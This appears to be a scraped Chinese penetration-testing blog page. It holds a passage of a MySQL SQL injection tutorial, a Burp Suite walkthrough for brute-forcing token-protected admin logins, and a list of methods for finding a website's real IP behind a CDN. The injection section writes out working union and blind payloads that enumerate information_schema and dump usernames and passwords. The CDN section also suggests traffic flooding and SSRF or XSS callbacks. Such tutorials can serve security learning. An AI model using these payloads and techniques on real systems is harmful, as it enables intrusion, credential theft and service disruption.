<h2 id="1-10-1-判断-SQL-注入"><a href="#1-10-1-判断-SQL-注入" class="headerlink" title="1.10.1  判断 SQL 注入"></a>1.10.1  判断 SQL 注入</h2><p>  输入 1’and ‘1’=’1 页面返回用户信息 1’and ‘1’=’2 页面返回不一样的信息 基本可以确定存在 SQL 注入漏洞</p>
<h2 id="1-10-2-判断字段数"><a href="#1-10-2-判断字段数" class="headerlink" title="1.10.2 判断字段数"></a>1.10.2 判断字段数</h2><p>使用语句 order by 确定当前表的字符数<br>order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类<br>推直到页面出错。正确的字段数是出错数字减少 1<br>公式 order by n-1<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1--+ 正常</span><br><span class="line">1&#x27; order by 2--+ 正常</span><br><span class="line">1&#x27; order by 3--+ 出错</span><br></pre></td></tr></table></figure></p>
<h2 id="1-10-3-联合查询注入获取敏感信息"><a href="#1-10-3-联合查询注入获取敏感信息" class="headerlink" title="1.10.3 联合查询注入获取敏感信息"></a>1.10.3 联合查询注入获取敏感信息</h2><p>联合查询 输入 数字 查询页面是否有数字输出。输出的地方就是显示的内容但<br>是被数字替换了。-1 是让前面的表查询的内容不存在。所以就会显示显示数字。<br>   <code>-1&#39; union select 1,2--+</code><br><img src="联合注入.png" alt=""><br>把数据替换成 mysql 的函数例如 md5(1) 这会在页面返回 1 的 md5 加密信息。<br>使用这个函数一般是白帽子扫描器的匹配存在漏洞的特征码。<br><img src="联合注入md5.png" alt=""></p>
<p><strong>接着获取 mysql 版本 当前用户权限 当前数据库<br>version() mysql 版本<br>database() 当前数据库<br>user() 当前用户名<br>group_concat()分组打印字符串<br>把函数直接替换数字查看页面</strong><br><code>-1&#39; union select 1,version()--+</code><br><img src="联合注入1.png" alt=""><br><strong>使用组命令查询多个元素，可用16进制转化为标点隔开</strong><br>如果你想一次打印多个敏感信息可以使用 group_concat()把查询的函数写人里<br>0x3A 是：这个符号的十六进制 在 mysql 里会自动转成符号：<br><a target="_blank" rel="noopener" href="https://www.litefeel.com/tools/ascii.php">ASCII码表在线查询</a><br><code>-1&#39; union select 1,group_concat(user(),0x3A,database(),0x3A,version())--+</code><br><img src="联合注入2.png" alt=""></p>
<h2 id="1-10-4-联合查询注入通过-information-schema-获取表"><a href="#1-10-4-联合查询注入通过-information-schema-获取表" class="headerlink" title="1.10.4 联合查询注入通过 information_schema 获取表"></a>1.10.4 联合查询注入通过 information_schema 获取表</h2><p>在黑盒的情况下是不知道当前库有什么表的，可以通过 mysql 自带的<br>information_schema 查询当前库的表。<br>查询当前库的表 limit 1 相当于 limit 1,1 表示显示第一个 1 改成 2 就是第二个<br>如此类推<br>第一个表<br><code>-1&#39; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)--+</code><br>第二个表<br><code>-1&#39; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)--+</code><br><img src="联合注入3.png" alt=""></p>
<h2 id="1-10-5-联合查询注入通过-information-schema-获取字"><a href="#1-10-5-联合查询注入通过-information-schema-获取字" class="headerlink" title="1.10.5 联合查询注入通过 information_schema 获取字"></a>1.10.5 联合查询注入通过 information_schema 获取字</h2><p>同样的查询字段也可以通过内置库 information_schema 里的 COLUMNS<br>这个表记录所有表的字段。通过 COLUMNS 查询 users 表的字段。<br>获取 users 表第一个字段名<br><code>-1&#39; union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;users&#39; limit 1))--+</code><br>获取 users 表第二个字段名<br><code>-1&#39; union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;users&#39; limit 2,1))--+</code><br>获取 users 表第三个字段名<br><code>-1&#39; union select 1,((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;users&#39; limit 3,1))--+</code><br><img src="联合注入5.png" alt=""></p>
<h2 id="1-10-6-通过联合查询表里的内容"><a href="#1-10-6-通过联合查询表里的内容" class="headerlink" title="1.10.6 通过联合查询表里的内容"></a>1.10.6 通过联合查询表里的内容</h2><p>通过以上的黑盒查询 获取库名、表名、字段、那么就可以查询某个表的内容。<br><code>-1&#39; union select 1,(select group_concat(user,0x3a,password) from users limit 1)--+</code><br><img src="联合注入5.png" alt=""></p>
<h2 id="1-11-判断盲注入"><a href="#1-11-判断盲注入" class="headerlink" title="1.11 判断盲注入"></a>1.11 判断盲注入</h2><p>输入 SQL 注入检测语句 判断页面是否不一样，如果不一样大概会存在 SQL 注<br>入漏洞 <code>1&#39;and &#39;1&#39;=&#39;1</code> 一样 <code>1&#39;and &#39;1&#39;=&#39;2</code> 不一样，如果输入检测语句页面没有任何改变可以使用延时语句进行检测 <code>1&#39;and sleep(10)--+</code> 函数 sleep() 在 mysql 是延时返回的意思 。以秒为单位 sleep(10) 即延时 10 秒执行。<br><img src="blind.png" alt=""></p>
<h2 id="1-11-1-boolean-布尔型注入攻击"><a href="#1-11-1-boolean-布尔型注入攻击" class="headerlink" title="1.11.1  boolean 布尔型注入攻击"></a>1.11.1  boolean 布尔型注入攻击</h2><p>布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面，但是可以通过构造 SQL 语句，获取数据。<br>布尔型盲注入用到的 SQL 语句 <code>select if(1=1,1,0)</code> if() 函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示1，否则显示 0 。 1=1 表达式可以换成构造的 SQL 攻击语句。<br><code>1&#39; and if(1=1,1,0)--+</code> 页面返回正常，这个语句实际上是 1’and 1，真 and 真 结果为真，1 是存在记录的。所以返回正确页面。<br><img src="blind.png" alt=""></p>
<p>1’ and if(1=2,1,0)—+ 页面返回错误，这个语句就是 1’and 0 ，真 and 假 结果为假，整个 SQL ID 的值也是 0 所以没有记录，返回错误页面。<br><img src="blind1.2.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2021/11/09/%E4%BD%BF%E7%94%A8-Burp-suite-%E5%AF%B9%E6%9C%89token%E7%9A%84%E7%BD%91%E7%AB%99%E7%A9%B7%E4%B8%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/09/%E4%BD%BF%E7%94%A8-Burp-suite-%E5%AF%B9%E6%9C%89token%E7%9A%84%E7%BD%91%E7%AB%99%E7%A9%B7%E4%B8%BE/" class="post-title-link" itemprop="url">使用 Burp suite 对有token的网站穷举</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-11-09 11:23:06" itemprop="dateCreated datePublished" datetime="2021-11-09T11:23:06+08:00">2021-11-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:49:44" itemprop="dateModified" datetime="2024-04-28T09:49:44+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/%E7%A9%B7%E4%B8%BE/" itemprop="url" rel="index"><span itemprop="name">穷举</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="使用-Burp-suite-对有token的网站穷举"><a href="#使用-Burp-suite-对有token的网站穷举" class="headerlink" title="使用 Burp suite 对有token的网站穷举"></a>使用 Burp suite 对有token的网站穷举</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p>有的网站后台存在 token 值，这个 token 通俗的名字叫令牌，每次刷新页面都会<br>随机变化。提交请求时必须携带这个 token 值，可以利用这点避免后台进行直接<br>穷举和防止 csrf 攻击。<br><img src="/image/介绍.png" alt="token"></p>
<h2 id="2-Burp-Suite-设置宏获取-token-对网站后台密码破解"><a href="#2-Burp-Suite-设置宏获取-token-对网站后台密码破解" class="headerlink" title="2. Burp Suite 设置宏获取 token 对网站后台密码破解"></a>2. Burp Suite 设置宏获取 token 对网站后台密码破解</h2><p>使用Burp Suite对目标网站进行抓包，接着 forward 放行这个数据包<br><img src="/image/forward.pnd" alt=""></p>
<p>来到 Project options —&gt; Session— &gt;add<br><img src="/image/创建宏.png" alt=""></p>
<p><img src="/image/创建宏1.png" alt=""><br>选择 Run a macro</p>
<p><img src="/image/创建宏2.png" alt=""></p>
<p><img src="/image/创建宏3.png" alt=""><br>点击之后选择网页历史选择<strong>GET</strong>提交方式查看是否有 <strong>token</strong> （注意信息长度）</p>
<p><img src="/image/创建宏4.png" alt=""></p>
<p><img src="/image/创建宏5.png" alt=""></p>
<p><img src="/image/创建宏6.png" alt=""><br>选择 value 的值 在 Parameter name 处填写 user_token 这个值一定要与键值（步骤11）相同</p>
<p><img src="/image/创建宏7.png" alt=""></p>
<p><img src="/image/创建宏8.png" alt=""></p>
<p><img src="/image/创建宏9.png" alt=""><br>将创建的 user_token 添加到步骤15中</p>
<p><img src="/image/创建宏10.png" alt=""></p>
<p><img src="/image/创建宏11.png" alt=""><br>选择应用全部 URL 也是可以的。<br>截止到这里宏就设置成功了</p>
<p>接着穷举测试 抓包 设置变量 添加密码字典<br><img src="/image/攻击.png" alt=""></p>
<p><img src="/image/攻击1.png" alt=""></p>
<p><img src="/image/攻击2.png" alt=""><br>添加字典</p>
<p><img src="/image/攻击3.png" alt=""><br>选择总是跳转</p>
<p><img src="/image/攻击4.png" alt=""><br>进行攻击</p>
<p><img src="/image/攻击5.png" alt=""><br>根据长度获得密码</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2021/09/28/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/28/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/" class="post-title-link" itemprop="url">部署CDN的网站找真实IP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-09-28 23:27:31" itemprop="dateCreated datePublished" datetime="2021-09-28T23:27:31+08:00">2021-09-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2022-03-13 12:09:00" itemprop="dateModified" datetime="2022-03-13T12:09:00+08:00">2022-03-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="部署CDN的网络找真实IP"><a href="#部署CDN的网络找真实IP" class="headerlink" title="部署CDN的网络找真实IP"></a>部署CDN的网络找真实IP</h1><h2 id="1-判断是否CDN"><a href="#1-判断是否CDN" class="headerlink" title="1.判断是否CDN"></a>1.判断是否CDN</h2><p>ping 域名<br><img src="ping.PNG" alt="查看是否有CDN"><br>使用超级ping<br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>     <a target="_blank" rel="noopener" href="http://ping.chinaz.com/">站长之家</a><br><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a>     <a target="_blank" rel="noopener" href="http://ping.aizhan.com/">爱站</a><br><a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a>       <a target="_blank" rel="noopener" href="https://www.17ce.com/">17ce</a><br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/www.t00ls.net">http://ping.chinaz.com/www.t00ls.net</a>    <a target="_blank" rel="noopener" href="http://ping.chinaz.com/www.t00ls.net">ChinaZ</a></p>
<h2 id="2-找真实IP的方法集合"><a href="#2-找真实IP的方法集合" class="headerlink" title="2. 找真实IP的方法集合"></a>2. 找真实IP的方法集合</h2><h3 id="2-1-DNS历史绑定记录"><a href="#2-1-DNS历史绑定记录" class="headerlink" title="2.1 DNS历史绑定记录"></a>2.1 DNS历史绑定记录</h3><p>通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。<br><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a>     <a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">DNS查询</a><br><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>    <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">微步在线</a><br><a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a>        <a target="_blank" rel="noopener" href="http://viewdns.info/">DNS、IP等查询</a><br><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a>      <a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">CDN查询IP</a><br><a target="_blank" rel="noopener" href="https://sitereport.netcraft.com/?url=域名">https://sitereport.netcraft.com/?url=域名</a><br><a target="_blank" rel="noopener" href="https://site.ip138.com/www.t00ls.net/">https://site.ip138.com/www.t00ls.net/</a>       <a target="_blank" rel="noopener" href="https://site.ip138.com/www.t00ls.net/">ip138</a></p>
<h3 id="2-2-域名解析"><a href="#2-2-域名解析" class="headerlink" title="2.2 域名解析"></a>2.2 域名解析</h3><p>通过子域名的解析指向 也有可能指向目标的同一个IP上。<br>使用工具对其子域名进行穷举<br><em>在线子域名查询</em><br><a target="_blank" rel="noopener" href="https://securitytrails.com/list/apex_domain/t00ls.net">https://securitytrails.com/list/apex_domain/t00ls.net</a><br><a target="_blank" rel="noopener" href="http://tool.chinaz.com/subdomain/t00ls.net">http://tool.chinaz.com/subdomain/t00ls.net</a><br><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>找到子域名继续确认子域名没有cdn的情况下批量进行域名解析查询，有cdn的情况继续查询历史。<br>域名批量解析<br><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/domain2ip.html">http://tools.bugscaner.com/domain2ip.html</a></p>
<h3 id="2-3-国外dns获取真实IP"><a href="#2-3-国外dns获取真实IP" class="headerlink" title="2.3 国外dns获取真实IP"></a>2.3 国外dns获取真实IP</h3><p>部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP<br><em>全世界DNS地址：</em><br><a target="_blank" rel="noopener" href="http://www.ab173.com/dns/dns_world.php">http://www.ab173.com/dns/dns_world.php</a><br><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a target="_blank" rel="noopener" href="https://dnshistory.org/">https://dnshistory.org/</a><br><a target="_blank" rel="noopener" href="http://whoisrequest.com/history/">http://whoisrequest.com/history/</a><br><a target="_blank" rel="noopener" href="https://completedns.com/dns-history/">https://completedns.com/dns-history/</a><br><a target="_blank" rel="noopener" href="http://dnstrails.com/">http://dnstrails.com/</a><br><a target="_blank" rel="noopener" href="https://who.is/domain-history/">https://who.is/domain-history/</a><br><a target="_blank" rel="noopener" href="http://research.domaintools.com/research/hosting-history/">http://research.domaintools.com/research/hosting-history/</a> <a target="_blank" rel="noopener" href="http://site.ip138.com/">http://site.ip138.com/</a><br><a target="_blank" rel="noopener" href="http://viewdns.info/iphistory/">http://viewdns.info/iphistory/</a><br><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a><br><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a><br><a target="_blank" rel="noopener" href="http://www.17ce.com/">http://www.17ce.com/</a><br><a target="_blank" rel="noopener" href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> <a target="_blank" rel="noopener" href="https://securitytrails.com/">https://securitytrails.com/</a><br><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<h3 id="2-4-ico图标通过空间搜索找真实ip"><a href="#2-4-ico图标通过空间搜索找真实ip" class="headerlink" title="2.4 ico图标通过空间搜索找真实ip"></a>2.4 ico图标通过空间搜索找真实ip</h3><p>下载图标<br>放到fofa识别<br>通过zoomeye搜图标<br>查询 快速定位资源 查看端口是否开放<br>绑定hosts进行测试<br><em>win10</em><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\host</span><br><span class="line">参数配置说明: ip + 空格 + 域名</span><br></pre></td></tr></table></figure><br><em>kali</em><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">vim</span><br></pre></td></tr></table></figure><br><code>curl</code> 进行测试</p>
<h3 id="2-5-fofa搜索真实IP"><a href="#2-5-fofa搜索真实IP" class="headerlink" title="2.5 fofa搜索真实IP"></a>2.5 fofa搜索真实IP</h3><p>domain=”t00ls.net” 302一般是cdn</p>
<h3 id="2-6-通过censys找真实ip"><a href="#2-6-通过censys找真实ip" class="headerlink" title="2.6 通过censys找真实ip"></a>2.6 通过censys找真实ip</h3><p>Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。<br>若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。<br>通过协议查询<br><a target="_blank" rel="noopener" href="https://search.censys.io/">https://search.censys.io/</a>       <a target="_blank" rel="noopener" href="https://search.censys.io/">censys</a></p>
<h3 id="2-7-360测绘中心"><a href="#2-7-360测绘中心" class="headerlink" title="2.7 360测绘中心"></a>2.7 360测绘中心</h3><p><a target="_blank" rel="noopener" href="https://quake.360.cn">https://quake.360.cn</a>    <a target="_blank" rel="noopener" href="https://quake.360.cn">360quake</a></p>
<h3 id="2-8-利用SSL证书寻找真实IP"><a href="#2-8-利用SSL证书寻找真实IP" class="headerlink" title="2.8 利用SSL证书寻找真实IP"></a>2.8 利用SSL证书寻找真实IP</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>获取网站SSL证书的HASH再结合Censys<br>利用Censys搜索网站的SSL证书及HASH，在<a target="_blank" rel="noopener" href="https://crt.sh上查找目标网站SSL证书的HASH">https://crt.sh上查找目标网站SSL证书的HASH</a><br>再用Censys搜索该HASH即可得到真实IP地址<br>SSL证书搜索引擎：<br><a target="_blank" rel="noopener" href="https://crt.sh">https://crt.sh</a>      <a target="_blank" rel="noopener" href="https://crt.sh">crt</a><br>找到hash    Decimal<br>转成ipv4 进行搜索</p>
<h3 id="2-9-邮箱获取真实IP"><a href="#2-9-邮箱获取真实IP" class="headerlink" title="2.9 邮箱获取真实IP"></a>2.9 邮箱获取真实IP</h3><p>网站在发信的时候，会附带真实的IP地址 </p>
<ol>
<li>进入邮箱 </li>
<li>查看源文件头部信息</li>
<li>选择from<h3 id="2-10-网站敏感文件获取真实IP"><a href="#2-10-网站敏感文件获取真实IP" class="headerlink" title="2.10 网站敏感文件获取真实IP"></a>2.10 网站敏感文件获取真实IP</h3></li>
</ol>
<ul>
<li>文件探针</li>
<li>phpinfo</li>
<li>网站源代码</li>
<li>信息泄露</li>
<li>GitHub信息泄露</li>
<li>js文件<h3 id="2-11-F5-LTM解码法"><a href="#2-11-F5-LTM解码法" class="headerlink" title="2.11 F5 LTM解码法"></a>2.11 F5 LTM解码法</h3>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取.<br>例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rverpool-cas01=3255675072.20480.0000; path=/</span><br><span class="line">3255675072 转十六进制 c20da8c0 从右向左取 c0a80dc2 转10进制 192 168 13 194</span><br></pre></td></tr></table></figure>
<h3 id="2-12-APP获取真实IP"><a href="#2-12-APP获取真实IP" class="headerlink" title="2.12 APP获取真实IP"></a>2.12 APP获取真实IP</h3>如果网站有app，使用Fiddler或BurpSuite抓取数据包 可能获取真实IP<br>模拟器 mumu模拟器抓包 <h3 id="2-13-小程序获取真实IP"><a href="#2-13-小程序获取真实IP" class="headerlink" title="2.13 小程序获取真实IP"></a>2.13 小程序获取真实IP</h3></li>
</ul>
<h3 id="2-14-配置不当获取真实IP"><a href="#2-14-配置不当获取真实IP" class="headerlink" title="2.14 配置不当获取真实IP"></a>2.14 配置不当获取真实IP</h3><p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
<ul>
<li>案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。</li>
<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。<h3 id="2-15-banner"><a href="#2-15-banner" class="headerlink" title="2.15 banner"></a>2.15 banner</h3>获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。<br>可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。<br>欧洲：<br><a target="_blank" rel="noopener" href="http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest">http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest</a>       <a target="_blank" rel="noopener" href="http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest">欧洲</a><br>北美：<br><a target="_blank" rel="noopener" href="https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest">https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest</a>   <a target="_blank" rel="noopener" href="https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest">北美</a><br>亚洲：<br>ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest  <a href="ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest">亚洲</a><br>非洲：<br>ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest     <a href="ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest">非洲</a><br>拉美：<br>ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest  <a href="ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest">拉美</a><br>获取CN的IP<br><a target="_blank" rel="noopener" href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a>       <a target="_blank" rel="noopener" href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone">CN</a></li>
</ul>
<ol>
<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。<a target="_blank" rel="noopener" href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a>   <a target="_blank" rel="noopener" href="https://github.com/zmap/zmap">ZMap</a></li>
<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。<a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>    <a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">Masscan</a><h3 id="2-16-长期关注"><a href="#2-16-长期关注" class="headerlink" title="2.16 长期关注"></a>2.16 长期关注</h3>在长期渗透的时候，设置程序每天访问网站，可能有新的发现。每天零点 或者业务需求增大 它会换ip 换服务器的。<h3 id="2-17-流量攻击"><a href="#2-17-流量攻击" class="headerlink" title="2.17 流量攻击"></a>2.17 流量攻击</h3>发包机可以一下子发送很大的流量。<br>这个方法是很笨，但是在特定的目标下渗透，建议采用。<br>cdn除了能隐藏ip，可能还考虑到分配流量，<br>不设防的cdn 量大就会挂，高防cdn 要大流量访问。<br>经受不住大流量冲击的时候可能会显示真实ip。<br>站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。<h3 id="2-18-被动获取"><a href="#2-18-被动获取" class="headerlink" title="2.18 被动获取"></a>2.18 被动获取</h3>被动获取就是让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP<br>如果网站有编辑器可以填写远程url图片，即可获取真实IP<br>如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。<h3 id="2-19-扫全网获取真实IP"><a href="#2-19-扫全网获取真实IP" class="headerlink" title="2.19 扫全网获取真实IP"></a>2.19 扫全网获取真实IP</h3><a target="_blank" rel="noopener" href="https://github.com/superfish9/hackcdn">https://github.com/superfish9/hackcdn</a><br><a target="_blank" rel="noopener" href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2021/09/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-09-18 00:36:35" itemprop="dateCreated datePublished" datetime="2021-09-18T00:36:35+08:00">2021-09-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:49:33" itemprop="dateModified" datetime="2024-04-28T09:49:33+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/%E5%87%86%E5%A4%87/" itemprop="url" rel="index"><span itemprop="name">准备</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
